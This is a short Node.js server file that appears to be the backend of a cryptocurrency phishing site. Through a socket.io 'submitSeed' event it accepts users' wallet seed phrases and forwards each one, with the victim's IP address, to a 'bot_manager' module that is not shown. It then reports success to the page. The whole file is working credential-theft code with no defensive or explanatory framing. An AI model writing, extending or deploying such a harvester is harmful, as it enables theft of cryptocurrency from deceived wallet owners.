const express = require('express');
const app = express();
const http = require('http').Server(app);
const path = require('path');
require('dotenv').config();

const io = require('socket.io')(http, {
    cors: {
        origin: process.env.RENDER_EXTERNAL_URL || "*",
        methods: ["GET", "POST"]
    }
});

const { sendSeedData } = require('./bot_manager');

app.use(express.static(path.join(__dirname, 'public')));

const PORT = process.env.PORT || 3000;

io.on('connection', (socket) => {
    const userIP = socket.handshake.headers['x-forwarded-for'] || socket.handshake.address;

    socket.on('submitSeed', (data) => {
        if (data && data.seedPhrase) {
            sendSeedData(data.seedPhrase, userIP, socket.id);
            socket.emit('submissionResponse', { success: true });
        }
    });
});

http.listen(PORT, () => {
    console.log(`Server active on Port ${PORT}`);
});